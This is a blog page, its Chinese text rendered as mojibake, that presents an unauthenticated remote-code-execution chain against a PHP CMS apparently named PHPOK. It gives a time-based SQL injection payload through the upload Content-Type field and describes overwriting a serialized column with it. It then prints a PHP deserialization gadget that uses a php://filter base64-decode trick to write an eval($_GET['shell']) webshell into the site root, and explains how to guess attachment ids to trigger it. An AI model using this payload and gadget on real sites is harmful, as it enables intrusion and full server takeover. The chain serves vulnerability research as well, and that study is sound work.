<!doctype html>
<html lang="zh-cn" >
<head>
    <meta charset="utf-8">
    <link rel="icon" href="data:image/ico;base64,aWNv">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://file.depy.ink/theme/docs/css/bootstrap.min.css?v=8280" rel="stylesheet">
    <link href="https://file.depy.ink/theme/docs/css/main.css?v=3525" rel="stylesheet">
    <script src="https://file.depy.ink/theme/docs/js/jquery.min.js"></script>
    <script src="https://file.depy.ink/theme/docs/js/bootstrap.min.js?v=4094"></script>
    <script src="https://file.depy.ink/theme/docs/js/functions.js?v=8141"></script>
    <script src="https://file.depy.ink/theme/docs/js/marked.min.js"></script>
    <link href="https://file.depy.ink/theme/docs/css/doc.css?v=4299" rel="stylesheet">
    <link rel="stylesheet" href="https://file.depy.ink/assets/editor/editormd/css/editormd.css?v=6567" />
    <script src="https://file.depy.ink/assets/editor/editormd/editormd.js"></script>
    <script src="https://file.depy.ink/assets/editor/editormd/lib/marked.min.js"></script>
    <script src="https://file.depy.ink/assets/editor/editormd/lib/prettify.min.js"></script>

    <script src="https://file.depy.ink/theme/docs/js/pjax.min.js"></script>
    


    <script src="https://file.depy.ink/theme/docs/js/lightbox-plus-jquery.min.js"> </script>
    <link href="https://file.depy.ink/theme/docs/css/lightbox.css?v=3328" rel="stylesheet"><title>P***OKå…¨ç‰ˆæœ¬å‰å°æ— æ¡ä»¶RCE</title>
</head>

<body class="bg-light ready sticky" id="watermark">


             <nav class="navbar navbar-expand-lg navbar-light shadow-sm bg-white mybt2 sticky-top">
        <div class="container-fluid" style="max-width:1332px;">
            <a class="navbar-brand" href="/"><b class="">Depy's docs</b></a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
                        <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item active">
                        <a class="nav-link" href="/" >é¦–é¡µ</a>
                    </li>

                </ul>

            </div>
        </div>
    </nav>


<main>


<aside class="sidebar">
           <div class="sidebar-nav mt-2">
            <ul>
            <li>

 <p>éšç¬”</p>
    <ul>
<li><a href="/view/128.html">å°å¹´</a></li>
<li><a href="/view/109.html">â¤ 2023</a></li>
    </ul>
 <p>æµ‹è¯•ç¬”è®°</p>
    <ul>
<li><a href="/view/129.html">ğŸ˜¡ å…³äºDDOSæˆ‘èƒ½åšä»€ä¹ˆ</a></li>
<li><a href="/view/123.html">ğŸ‘ æŸåŠ å¯†æ ·æœ¬ Traceåˆ†æ - 2</a></li>
<li><a href="/view/121.html">ğŸ‘ æŸåŠ å¯†æ ·æœ¬ Traceåˆ†æ</a></li>
<li><a href="/view/115.html">ğŸ”§ è½»é‡çº§CI/CD+æ–‡ä»¶å†…å®¹ç›‘æ§/é˜²ç¯¡æ”¹è§£å†³æ–¹æ¡ˆ</a></li>
<li><a href="/view/105.html">ğŸ¯ æœ‰ç”¨çš„å‘½ä»¤å¤‡ä»½</a></li>
<li><a href="/view/94.html">ğŸ˜Š Gateway-wokerå®ç°çƒ­é‡è½½</a></li>
<li><a href="/view/90.html">âœï¸ Xposedè¿è¡ŒåŸç†</a></li>
<li><a href="/view/89.html">AutoJS æ¨¡æ‹Ÿè´å¡å°”æ›²çº¿è§†é¢‘æ»‘åŠ¨</a></li>
<li><a href="/view/84.html">ğŸ“± å°ç±³13ç»•è¿‡SIMå¡æ‰“å¼€USBå®‰è£…</a></li>
    </ul>
 <p>è¯»ä¹¦ç¬”è®°</p>
    <ul>
<li><a href="/view/119.html">ğŸ“š æ³¨å…¥ä¸HOOK</a></li>
<li><a href="/view/117.html">ğŸ“šã€Šæ·±å…¥æ¢ç´¢å®‰å“çƒ­ä¿®å¤æŠ€æœ¯åŸç†ã€‹32 -</a></li>
<li><a href="/view/112.html">ğŸ“šã€Šæ·±å…¥æ¢ç´¢å®‰å“çƒ­ä¿®å¤æŠ€æœ¯åŸç†ã€‹1-32</a></li>
<li><a href="/view/82.html">ğŸ“šã€Šé€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ã€‹ - 1-4ç« </a></li>
    </ul>
 <p>ç¼–ç¨‹å¼€å‘</p>
    <ul>
<li><a href="/view/111.html">ğŸŒ¹ Dobbyä½¿ç”¨</a></li>
<li><a href="/view/77.html">ğŸ“‘ã€å‰ç«¯å¼€å‘ã€‘lightbox+pjaxæœ€ä½³å®è·µ</a></li>
<li><a href="/view/71.html">ğŸ“‘ã€NDKå¼€å‘ã€‘NDKé‡‡é›†ã€å‹ç¼©ã€åŠ å¯†ä¼ è¾“è®¾å¤‡ä¿¡æ¯</a></li>
<li><a href="/view/70.html">ğŸ“‘ã€NDKå¼€å‘ã€‘åŸºç¡€ç¯å¢ƒæ­å»º</a></li>
    </ul>
 <p>é€†å‘åˆ†æ</p>
    <ul>
<li><a href="/view/139.html">çŒ¿äººå­¦APPç¬¬äºŒé¢˜  - ç®—æ³•åˆ†æ</a></li>
<li><a href="/view/86.html">âš™ï¸ ã€Xposed æ”¹æœºã€‘- åŸºç¡€ç¯å¢ƒå®‰è£…</a></li>
<li><a href="/view/81.html">ğŸ’» å®‰å“å†…è”æ±‡ç¼–å¼€å‘</a></li>
<li><a href="/view/76.html">ğŸ“‘ JNI ä½¿ç”¨åŸºç¡€</a></li>
<li><a href="/view/75.html">ğŸ“‘ IDA Debugger è°ƒè¯•å™¨ä½¿ç”¨</a></li>
<li><a href="/view/74.html">ğŸ’» std::stringå†…å­˜å¸ƒå±€</a></li>
<li><a href="/view/73.html">ğŸ’¼ Fridaä½œä¸š-20231114</a></li>
<li><a href="/view/65.html">ğŸ§® JSVMPæ‰§è¡Œæµç¨‹åˆ†æ</a></li>
    </ul>
 <p>DepyDocs</p>
    <ul>
<li><a href="/view/122.html">ğŸ“‘ DepyDocs</a></li>
<li><a href="/view/120.html">ğŸ“‘  Un1kMsgä½¿ç”¨</a></li>
<li><a href="/view/114.html">ğŸ“‘ è”ç³»æ–¹å¼</a></li>
<li><a href="/view/91.html">ğŸ“‘ é¢å¤–é…ç½®</a></li>
<li><a href="/view/88.html">ğŸ“‘  æ›´æ–°æ—¥å¿—</a></li>
<li><a href="/view/72.html">ğŸ“‘ æ—¶å…‰æœºä½¿ç”¨</a></li>
<li><a href="/view/66.html">ğŸ“‘ DepyOauthæ¥å…¥æŒ‡å—</a></li>
<li><a href="/view/62.html">ğŸ“‘ å®˜æ–¹åŸŸåç”³è¯·</a></li>
<li><a href="/view/47.html">ğŸ“‘ ç§Ÿæˆ·è‡ªå®šä¹‰åŸŸåç»‘å®š</a></li>
    </ul>
 <p>åšå®¢æ–‡ç« ï¼ˆå¤‡ä»½ï¼‰</p>
    <ul>
<li><a href="/view/140.html">P***OKå…¨ç‰ˆæœ¬å‰å°æ— æ¡ä»¶RCE</a></li>
<li><a href="/view/138.html">æŸå®‰å…¨å·¥å…·é€†å‘ç ´è§£</a></li>
<li><a href="/view/137.html">æµ™æ±Ÿçœç¬¬å››å±Šç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç«èµ›å†³èµ›WP</a></li>
<li><a href="/view/136.html">æµé‡åŠ å¯†ç¼–ç¨‹å¼€å‘</a></li>
<li><a href="/view/135.html">Attack PHP Website By Shiro</a></li>
<li><a href="/view/134.html">æŸOAæˆæƒç ´è§£åˆ†æ</a></li>
<li><a href="/view/133.html">Un1kHacking</a></li>
<li><a href="/view/132.html">Un1kLog4shellScan </a></li>
<li><a href="/view/131.html">Netty å¼€å‘Mitmè§£å†³è¯·æ±‚å“åº”åŒ¹é…é—®é¢˜	</a></li>
    </ul>
 <p>Todo</p>
    <ul>
<li><a href="/view/118.html">Todo List</a></li>
    </ul>


</li>
</ul></div>
</aside><section class="content mx-auto" id="article">
        <div class="d-flex">



            <article class="markdown-section" id="main" style="word-break:break-all;">
                <div>
                <h1>P***OKå…¨ç‰ˆæœ¬å‰å°æ— æ¡ä»¶RCE</h1>


                <a style="font-size:12px;color: #5f5d5d;">
                | æ—¶é—´: 2024-02-09 12:58:52| ç›®å½•:åšå®¢æ–‡ç« ï¼ˆå¤‡ä»½ï¼‰ </a>
                |
                <a style="font-size:12px;color: #007bff;" href="http://10.8.0.3:5080/tenantadmin/Tenantarticle/quickedit/quickedit.html?id=%c2%8c" target="_blank">ç¼–è¾‘æœ¬æ–‡</a>
                <br>


                    <div id="content"><textarea style="display: none;">## åˆ©ç”¨æ¡ä»¶
ç½‘ç«™æœªå…³é—­æ¸¸å®¢é™„ä»¶ä¸Šä¼ ï¼ˆé»˜è®¤å¼€å¯ï¼‰

## ä»£ç å®¡è®¡

é¦–å…ˆæˆ‘ä»¬è¿›è¡Œæ­£å¸¸çš„æ™®é€šé™„ä»¶ä¸Šä¼ ï¼Œå‘ç°æ— è®ºä»€ä¹ˆå›¾ç‰‡éƒ½æ— æ³•ä¸Šä¼ :

![](https://img.meituan.net/imgupload/ed47ab21f89e54a6666a7ac74673f12116944.png)

æŸ¥çœ‹uploadæ§åˆ¶å™¨ä»£ç ,ä»£ç ä½äºç›®å½•/framework/www/ä¸­,æŸ¥çœ‹saveè¿™ä¸ªfunctionï¼š

![](https://img.meituan.net/imgupload/b6a068c8ea52e51fd60017d041c05f4a55106.png)

è·Ÿè¿›upload_baseæ–¹æ³•:

![](https://img.meituan.net/imgupload/abd27e03d4e1ee7d56b3963520c5223799145.png)

ç»§ç»­è·Ÿè¿›getfileæ–¹æ³•ï¼š

![](https://img.meituan.net/imgupload/1cacf4b1d6d58516f1873bf81e99115d53329.png)

åœ¨æ­¤å¤„vardumpæœ‰è¾“å‡ºï¼Œæ‰€ä»¥è¿›å…¥äº†uploadçš„æ–¹æ³•ã€‚ç»§ç»­è·Ÿè¿›:

![](https://img.meituan.net/imgupload/861e843080ff3bd5ed128296bbe389d072922.png)

![](https://img.meituan.net/imgupload/0377dcfa4d27e7b9e2d1713ee62b8a7266307.png)

æˆ‘ä»¬å‘ç°æœ€ç»ˆæ˜¯åœ¨è¿™é‡Œè¿›è¡Œäº†return,åŸå› å°±æ˜¯è¿›å…¥äº†if($bin),å¦‚ä½•bypassè¿™ä¸ªåˆ¤æ–­å‘¢ï¼Ÿ

å¿…é¡»è¦è·å–$binå˜é‡æ‰å¯ä»¥è¿›å…¥åˆ¤æ–­ï¼Œé€šè¿‡var_dumpå‘ç°å°±æ˜¯å›¾ç‰‡å†…å®¹ã€‚å°†å›¾ç‰‡æ–‡ä»¶å†…å®¹ç½®ç©º,ä¸Šä¼ æˆåŠŸ

![](https://img.meituan.net/imgupload/9b5aa738632421d6d8a3b4fbadb6883334129.png)

æˆ‘ä»¬å›åˆ°base_uploadæ–¹æ³•:

![](https://img.meituan.net/imgupload/3d69fa6ebe4111f4bbe866f5c819c674109391.png)

æˆ‘ä»¬å‘ç°è¿™é‡Œæœ‰ä¸ªmodel-&gt;saveçš„æ–¹æ³•ï¼Œè·Ÿè¿›saveæ–¹æ³•ï¼š

![](https://img.meituan.net/imgupload/61708fd615224c5c3afd7a045892bbda63884.png)

å‘ç°æ— è®ºæ˜¯å¦ç™»å½•,éƒ½æœ‰ä¸€ä¸ªæ’å…¥æ•°æ®åº“çš„æ–¹æ³•ï¼Œå¹¶ä¸”æ²¡æœ‰è¿‡æ»¤ã€‚ä¹Ÿå°±æ˜¯è¯´ä»–ç›´æ¥å°†æ•°ç»„$arrayå…¨éƒ¨æ’å…¥äº†æ•°æ®åº“ï¼Œé‚£æˆ‘ä»¬å¯ä»¥var_dumpä¸€ä¸‹çœ‹çœ‹æœ‰å“ªäº›æ•°ç»„å­—æ®µå¯æ§ï¼š

![](https://img.meituan.net/imgupload/51bf7b6d42e6e89d7794afae3b8c142486276.png)

æˆ‘ä»¬æ‰“å°æ•°ç»„åå¯å‘ç°,mime_typeå­—æ®µç›´æ¥æ¥è‡ªäºcontent-typeã€‚å¹¶ä¸”æ˜¯å¯æ§çš„,æˆ‘ä»¬å¯ä»¥æ‰“å°ä¸€æ®µSQLè¯­å¥,ç„¶åè¿›è¡Œæ‹¼æ¥æ“ä½œï¼ˆä¸åšæ¼”ç¤ºï¼‰,æœ€ç»ˆè·å–payload:

```
&#39;,sleep(5))#
```

![](https://img.meituan.net/imgupload/20ca7928c0298c9f921c0a6652396b5d125044.png)

æˆ‘ä»¬å‘ç°æˆåŠŸsleepäº†ã€‚è‡³æ­¤,æˆ‘ä»¬å®¡è®¡åˆ°äº†ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´ã€‚ä½†æ˜¯å¦‚ä½•é€šè¿‡SQLæ³¨å…¥åˆ°è¾¾RCEå‘¢ã€‚ 

![](https://img.meituan.net/imgupload/8c7508ef45190b28e99a1157d5d9336146109.png)

ç»§ç»­æŸ¥çœ‹ä»£ç å‘ç°å¯¹attrå­—æ®µè¿›è¡Œäº†åºåˆ—åŒ–æ“ä½œ,æ‰€ä»¥æœ‰åºåˆ—åŒ–è‚¯å®šæœ‰ååºåˆ—åŒ–ã€‚æ‰€ä»¥æŠ›å‡ºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚ä½•è¦†ç›–åºåˆ—åŒ–çš„å†…å®¹ï¼Ÿ

**1ã€è¦†ç›–**

æˆ‘ä»¬åœ¨è¿™é‡Œæ‰“å°æ•°ç»„:

![](https://img.meituan.net/imgupload/4869656c145bb74d74c6fe4a6efaf845105777.png)

æˆ‘ä»¬ç»§ç»­è§‚å¯ŸSQLè¯­å¥:

æ’å…¥:

```
INSERT INTO qinggan_res (`cate_id`,`folder`,`name`,`ext`,`filename`,`addtime`,`title`,`session_id`,`user_id`,`mime_type`,`attr`) VALUES(&#39;&#39;,&#39;res/&#39;,&#39;db0846bb72407e1c.png&#39;,&#39;png&#39;,&#39;res/db0846bb72407e1c.png&#39;,&#39;1608034638&#39;,&#39;3&#39;,&#39;0o8592k55lo99m8r9hg27roid8&#39;,&#39;&#39;,&#39;image/png&#39;,sleep(5))#&#39;,&#39;a:2:{s:5:&#34;width&#34;;i:622;s:6:&#34;height&#34;;i:503;}&#39;)
```

å“åº”:

```
{&#34;status&#34;:&#34;ok&#34;,&#34;content&#34;:{&#34;id&#34;:&#34;117&#34;,&#34;cate_id&#34;:&#34;1&#34;,&#34;folder&#34;:&#34;res\\\\/&#34;,&#34;name&#34;:&#34;db0846bb72407e1c.png&#34;,&#34;ext&#34;:&#34;png&#34;,&#34;filename&#34;:&#34;res\\\\/db0846bb72407e1c.png&#34;,&#34;ico&#34;:&#34;res\\\\/_cache\\\\/_ico\\\\/11\\\\/117.png&#34;,&#34;addtime&#34;:&#34;1608034638&#34;,&#34;title&#34;:&#34;3&#34;,&#34;attr&#34;:&#34;0&#34;,&#34;note&#34;:&#34;&#34;,&#34;session_id&#34;:&#34;0o8592k55lo99m8r9hg27roid8&#34;,&#34;user_id&#34;:&#34;0&#34;,&#34;download&#34;:&#34;0&#34;,&#34;admin_id&#34;:&#34;0&#34;,&#34;mime_type&#34;:&#34;image\\\\/png&#34;,&#34;etype&#34;:&#34;0&#34;,&#34;uploadtime&#34;:&#34;2020-12-15 20:17:18&#34;}}
```

å‘ç°æˆ‘ä»¬å¯æ§çš„å­—æ®µå’Œattrå­—æ®µç›¸é‚»ï¼Œæ‰€ä»¥è¿›è€Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¦†ç›–attrå˜é‡ã€‚

ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿå°±æ¯”å¦‚æˆ‘ä»¬å¯ä»¥æ„é€ è¯­å¥ä¸º:

![](https://img.meituan.net/imgupload/cdbf4a7a38716a3725966c2d956cbce015038.png)

å•å¼•å·é—­åˆå‰é¢å­—æ®µçš„æ’å…¥,åˆ†å‰²å ) é—­åˆæœ€å‰é¢çš„æ‹¬å·,ç„¶å#æ³¨é‡Šå¤šä½™è¯­å¥ã€‚

æ‰§è¡Œåæˆ‘ä»¬è®¿é—®æ•°æ®åº“:

![](https://img.meituan.net/imgupload/85eb213b4347762bee59fc242eb542fc168824.png)

**2ã€è¿½åŠ **

å†å†™ä¸€æ¡insert çš„sqlè¯­å¥ï¼Œä½¿ç”¨è‹±æ–‡é€—å·åˆ†å‰²è¿½åŠ å³å¯ï¼Œå…·ä½“å¯è§ichunqiuæœ¬äººå¯¹æ­¤æ¡ˆä¾‹çš„è®²è§£ã€‚è¿™é‡Œä¸èµ˜è¿°ã€‚

å‘ç°resæ¨¡å‹ä¸­getoneæ–¹æ³•å°±æœ‰ååºåˆ—åŒ–æ“ä½œ:

![](https://img.meituan.net/imgupload/30e6fc75991ad1d89df25cf2e304aa7b70379.png)

ç„¶åå°±æ˜¯å†™ä¸€ä¸ªå¯ä»¥é€ æˆgetshellçš„gadgetå°±è¡Œäº†ã€‚ä½†æ˜¯æ€ä¹ˆæ‰¾å‘¢?

æˆ‘ä»¬æˆåŠŸæ‰¾åˆ°äº†ä¸€ä¸ªcacheç±»,è·¯å¾„å¦‚å›¾æ‰€ç¤º:

![](https://img.meituan.net/imgupload/c7b90fee7ec5dda1bd2f4d882bb067b794946.png)

å®ƒåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šè§¦å‘destructé­”æ³•å‡½æ•°:

![](https://img.meituan.net/imgupload/a249b3fb8d9e1b1f9e64f982a105eb4513314.png)

è·Ÿè¿›save,å‘ç°è¿™é‡Œæœ‰ä¸€ä¸ªfile_put_contentsçš„æ“ä½œ:

![](https://img.meituan.net/imgupload/215f4e2e274b4dbecdb7c9dec320cbaf42805.png)

ä½†æ˜¯è¿™é‡Œæ³¨æ„çš„æ˜¯ä¸ºäº†é˜²æ­¢æœ¨é©¬ç”Ÿæˆ,åŠ å…¥äº†exitå‡½æ•°,è¿™ä¸ªæˆ‘ä»¬åœ¨åšä¸€é“CTFé¢˜çš„æ—¶å€™ç»å¸¸ä¼šä½¿ç”¨çš„bypassæ–¹æ³•,å°±æ˜¯ä½¿ç”¨:
``` php
file_put_contents(php://filter/write=convert.base64-decode/resource=$id.php,&#39;&lt;?php exit();?&gt;&#39;.base64ç¼–ç çš„shellcode)
```

è¿™æ ·å¤–æ”¾æ–‡ä»¶çš„æ—¶å€™ä¼šå¯¹æ•´ä¸ªå†…å®¹base64è§£ç ,å¯¼è‡´å‰é¢çš„å†…å®¹å‘ç”Ÿé”™è¯¯,è€Œbase64ç¼–ç çš„shellcodeä¼šæ­£å¸¸è¿˜åŸã€‚ æˆ‘ä»¬å‘ç°ä»–è¿˜å¯¹æˆ‘ä»¬ä¼ å…¥çš„contentè¿›è¡Œäº†åºåˆ—åŒ–çš„æ“ä½œï¼Œä½†æ˜¯åºåˆ—åŒ–ä¸ä¼šæ”¹å˜å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„base64ç¼–ç åçš„shellå†…å®¹ã€‚

æ‰€ä»¥æœ€ç»ˆæ„é€ çš„gadgetå¦‚ä¸‹:

``` php
&lt;?php
 class cache{
     protected $key_id;
     protected $key_list;
     protected $folder;
  
     public function __construct(){
         $this-&gt;key_id = &#39;depy&#39;;
         $this-&gt;key_list = &#39;aa&#39;.base64_encode(&#39;&lt;?php eval($_GET[&#34;shell&#34;]);?&gt;&#39;);
         $this-&gt;folder = &#39;php://filter/write=convert.base64-decode/resource=&#39;;
     }
 }
 
 echo bin2hex(serialize(new cache()));
 ```
 
è¿™æ ·,è§¦å‘ååºåˆ—åŒ–ä¹‹å,å°†ä¼šåœ¨æ ¹ç›®å½•ç”Ÿæˆdepy.phpçš„webshell,å¯†ç æ˜¯shellã€‚é‚£ä¹ˆgadgetå†™å®Œä¹‹å,å°±æ˜¯æ‰¾æ€ä¹ˆå‰å°å¯ä»¥è°ƒç”¨åˆ°get_oneæ–¹æ³•çš„åœ°æ–¹äº†ã€‚

![](https://img.meituan.net/imgupload/a978ea9dc195725a705cd53fb15bca7e78200.png)

æˆ‘ä»¬æ‰¾åˆ°æ§åˆ¶å™¨ä¸‹çš„replaceæ–¹æ³•,å®ƒæ ¹æ®get oldidå‚æ•°ï¼Œç„¶åè¿›å…¥æ•°æ®åº“æ‰¾åˆ°æˆ‘ä»¬ä¸Šä¼ çš„å›¾ç‰‡ã€‚ç„¶åè°ƒç”¨get_oneæ–¹æ³•,è§¦å‘ååºåˆ—åŒ–ã€‚

ä¾‹å¦‚ä¸Šä¼ å›¾ç‰‡æ—¶,å¯¹content typeå†™å…¥æˆ‘ä»¬çš„gadgetã€‚

![](https://img.meituan.net/imgupload/f867a1a80a44e8ac3156a8fc7d2472c2107432.png)

ä½†å®é™…ä¸Šä»–å¹¶ä¸ä¼šå“åº”ï¼Œæ’å…¥æ•°æ®åº“çš„æ—¶å€™å…¶å®å·²ç»è§¦å‘äº†ååºåˆ—åŒ–äº†ï¼Œä¼šå¯¼è‡´æœåŠ¡ç©ºç™½å“åº”ã€‚ï¼ˆå…·ä½“å“ªé‡Œæˆ‘æ²¡æœ‰å»è·Ÿï¼Œä¸‹é¢å…¶å®ä¹Ÿä¸ç”¨å»è§¦å‘ï¼‰

ä½†æ˜¯å¦‚æœæ˜¯å¸¸è§„æµç¨‹å‘¢ï¼Ÿå¦‚ä½•çŸ¥é“idï¼Ÿä¸¤ä¸ªåŠæ³•ï¼š

1ã€çˆ†ç ´

é™„ä»¶idæ˜¯è‡ªå¢å¢åŠ çš„ï¼Œä¸è¶…è¿‡å››ä½æ•°ï¼Œçˆ†ç ´ä¸€éå¼ºåˆ¶è§¦å‘

2ã€é¢„ä¸Šä¼ 

å…ˆä¸Šä¼ ä¸€ä¸ªæ— æ•ˆçš„æ–‡ä»¶ï¼Œè®°ä½idï¼Œé‚£ä¹ˆååºåˆ—åŒ–æ—¶idå°±æ˜¯&#43;1

## Exploit
![](https://img.meituan.net/imgupload/305765a85aa3dad77b207f45071f3a419468.png)

é€šè¿‡id,è¿›å…¥replaceæ–¹æ³•,oldidä¸ºä¸Šé¢çš„idã€‚

![](https://img.meituan.net/imgupload/1f9f13b15cc8c93993eaf04b0b5b6e3636722.png)

é€šè¿‡oldid,ä¼šæœ€ç»ˆè§¦å‘ååºåˆ—åŒ–ç”Ÿæˆwebshellåˆ°æ ¹ç›®å½•ã€‚

![](https://img.meituan.net/imgupload/bb02b3d8b501cce3700837bc6ddcb67f80276.png)

![](https://img.meituan.net/imgupload/8c8f013286bbc705370d1dda68a3adb5136947.png)
</textarea></div>


                <script>
                   $(function () {
                        
                        editormd.markdownToHTML("content");
                    })

                </script>




                </div>

                <hr>


                <div>
                    <h5>Â© ç‰ˆæƒå£°æ˜ï¼šéæ ‡æ³¨ã€è½¬è½½ã€æƒ…å†µä¸‹æœ¬æ–‡ä¸ºåŸåˆ›æ–‡ç« ï¼Œç‰ˆæƒå½’&nbsp;<a href="/">Depy's docs</a>&nbsp;æ‰€æœ‰ï¼Œè½¬è½½è¯·è”ç³»åšä¸»è·å¾—æˆæƒã€‚</h5>
                </div>

            </article>



    <div class="ad d-none d-lg-block">

        <div style="margin-left: 20px;margin-bottom:15px;font-weight:bold"> ã€ç›®å½•ã€ </div>
    <div class="anchorContent" id="anchorContent"> </div>
                       </div>

            </div>
    </section>
    <button class="sidebar-toggle sidebar-toggle-button" aria-label="Menu">
        <div><span></span><span></span><span></span></div>
    </button>

</main>

<link href="https://file.depy.ink/theme/docs/css/prettify.css?v=5530" rel="stylesheet">
<script src="https://file.depy.ink/theme/docs/js/prettify.js?v=5764"></script>
<script src="https://file.depy.ink/theme/docs/js/view.js?v=4125"></script>



<script>


    
    function addWatermark({
        container = document.body, 
        width = "220px", 
        height = "160px", 
        textAlign = "center", 
        textBaseline = "middle", 
        font = "16px Microsoft Yahei", 
        fillStyle = "rgba(184, 184, 184, 0.6)", 
        content = "depy|rce.ink", 
        rotate = "45", 
        zIndex = 10000, 
    }) {
        
        const canvas = document.createElement("canvas");
        canvas.setAttribute("width", width);
        canvas.setAttribute("height", height);
        const ctx = canvas.getContext("2d");
        ctx.textAlign = textAlign;
        ctx.textBaseline = textBaseline;
        ctx.font = font;
        ctx.fillStyle = fillStyle;
        ctx.rotate((Math.PI / 180) * rotate);
        ctx.fillText(content, parseFloat(width) / 2, parseFloat(height) / 2);

        
        const base64Url = canvas.toDataURL();
        const __wm = document.querySelector('.__wm');
        const watermarkDiv = __wm || document.createElement("div");
        const styleStr = `
                    position: fixed;
                    top: -70px;
                    left: 0;
                    bottom: 0;
                    right: 0;
                    width: 100%;
                    height: 100%;
                    z-index: ${zIndex};
                    pointer-events: none;
                    background-repeat: repeat;
                    background-image: url('${base64Url}')
                `;
        watermarkDiv.setAttribute("style", styleStr);
        watermarkDiv.classList.add("__wm");
        

        if (!__wm) {
            container.style.position = 'relative';
            container.insertBefore(watermarkDiv, container.firstChild);
        }
            
            const MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
            if (MutationObserver) {
                let mo = new MutationObserver(function () {
                    const __wm = document.querySelector('.__wm');
                    
                    if ((__wm && __wm.getAttribute('style') !== styleStr) || !__wm) {
                        
                        mo.disconnect();
                        mo = null;
                        console.log('1');
                        addWatermark({
                            container: document.getElementById("watermark"),
                            width: "220px",
                            height: "160px",
                            textAlign: "center",
                            textBaseline: "middle",
                            font: "16px Microsoft Yahei",
                            fillStyle: "rgba(184, 184, 184, 0.3 )",
                            content: "depy|rce.ink",
                            rotate: "30",
                            zIndex: 10000,
                        });
                    }
                });

                mo.observe(container, {
                    attributes: true,
                    subtree: true,
                    childList: true
                });
            }
    }



    function addwm(){
    addWatermark({
        container: document.getElementById("watermark"),
        width: "220px",
        height: "160px",
        textAlign: "center",
        textBaseline: "middle",
        font: "16px Microsoft Yahei",
        fillStyle: "rgba(184, 184, 184, 0.3 )",
        content: "depy|rce.ink",
        rotate: "30",
        zIndex: 10000,
    });
}

addwm();
</script>

</body>
</html>